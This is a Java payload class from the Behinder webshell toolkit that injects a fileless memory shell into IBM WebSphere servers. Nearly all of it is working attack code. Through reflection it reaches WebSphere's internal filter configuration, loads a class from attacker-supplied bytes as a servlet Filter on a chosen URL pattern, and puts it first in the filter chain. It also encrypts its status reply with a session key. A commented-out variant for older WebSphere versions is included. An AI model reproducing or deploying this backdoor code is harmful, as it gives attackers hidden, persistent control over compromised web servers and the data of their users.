package net.rebeyond.behinder.payload.java.memoryshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Websphere extends ClassLoader {
    public static String urlPattern;
    public static String shellString;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();

        try{
            // https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/websphere/FilterBasedBasic.java
            // Tested on Websphere Applicaton Server v8.5 and v9.0

//            ServletContext servletContext = this.Request.getServletContext();
//
//            Field field = servletContext.getClass().getDeclaredField("context");
//            field.setAccessible(true);
//            Object context = field.get(servletContext);
//
//            field = context.getClass().getSuperclass().getDeclaredField("config");
//            field.setAccessible(true);
//            Object webAppConfiguration = field.get(context);
//
//            Method method = null;
//            Method[] methods = webAppConfiguration.getClass().getMethods();
//            for(int i = 0; i < methods.length; i++){
//                if(methods[i].getName().equals("getFilterMappings")){
//                    method = methods[i];
//                    break;
//                }
//            }
//            List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);
//
//            boolean flag = false;
//            String filterName = "filter" + System.currentTimeMillis();
//            for(int i = 0; i < filerMappings.size(); i++){
//                Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
//                String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
//                if(name.equals(filterName)){
//                    flag = true;
//                    break;
//                }
//            }
//
//            if(!flag){
//                Filter filterShell = (Filter) new Websphere(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1)).newInstance();
//
//                Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
//                filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filterShell});
//
//                method = null;
//                methods = webAppConfiguration.getClass().getMethods();
//                for(int i = 0; i < methods.length; i++){
//                    if(methods[i].getName().equals("addFilterInfo")){
//                        method = methods[i];
//                        break;
//                    }
//                }
//                method.invoke(webAppConfiguration, new Object[]{filterConfig});
//
//                field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
//                field.setAccessible(true);
//                Object original = field.get(filterConfig);
//
//                //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
//                field.set(filterConfig, null);
//
//                method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
//                method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});
//
//                //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
//                field.set(filterConfig, original);
//
//                method = null;
//                methods = webAppConfiguration.getClass().getMethods();
//                for(int i = 0; i < methods.length; i++){
//                    if(methods[i].getName().equals("getUriFilterMappings")){
//                        method = methods[i];
//                        break;
//                    }
//                }
//
//                //这里的目的是为了将我们添加的动态 Filter 放到第一位
//                List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);
//                uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
//            }


            // 测试环境：WebSphere Application Server Version 20.0.0.12 Liberty
            Object servletContext = this.Request.getServletContext();
            Field field = servletContext.getClass().getSuperclass().getSuperclass().getDeclaredField("context");
            field.setAccessible(true);
            Object context = field.get(servletContext);

            field = context.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("config");
            field.setAccessible(true);
            Object webAppConfiguration = field.get(context);

            Method method = webAppConfiguration.getClass().getMethod("getFilterMappings");
            method.setAccessible(true);

            List filerMappings = (List) method.invoke(webAppConfiguration);
            String filterName = "filter" + System.currentTimeMillis();
            Filter filterShell = (Filter) new Websphere(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1)).newInstance();

            method = context.getClass().getMethod("createFilterConfig", String.class);
            method.setAccessible(true);
            Object filterConfig = method.invoke(context, filterName);

            method = filterConfig.getClass().getMethod("setFilter", Filter.class);
            method.setAccessible(true);
            method.invoke(filterConfig, filterShell);

            method = webAppConfiguration.getClass().getMethod("addFilterInfo", filterConfig.getClass().getInterfaces()[0]);
            method.setAccessible(true);
            method.invoke(webAppConfiguration, filterConfig);

            field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
            field.setAccessible(true);
            Object original = field.get(filterConfig);

            field.set(filterConfig, null);

            method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", EnumSet.class, boolean.class, String[].class);
            method.invoke(filterConfig, EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern});
            field.set(filterConfig, original);

            method = webAppConfiguration.getClass().getMethod("getUriFilterMappings");
            method.setAccessible(true);
            List uriFilterMappingInfos = (List) method.invoke(webAppConfiguration);
            uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size()-1));

            result.put("msg", "成功");
            result.put("status", "success");
        }catch(Exception e){
//            e.printStackTrace();
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }

        try {

            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    public Websphere() {}
    public Websphere(ClassLoader c){
        super(c);
    }
    public Class g(byte[] b){
        return super.defineClass(b, 0, b.length);
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode)
            {
                if (version.compareTo("1.9") >= 0) {

                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                }
                else {

                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
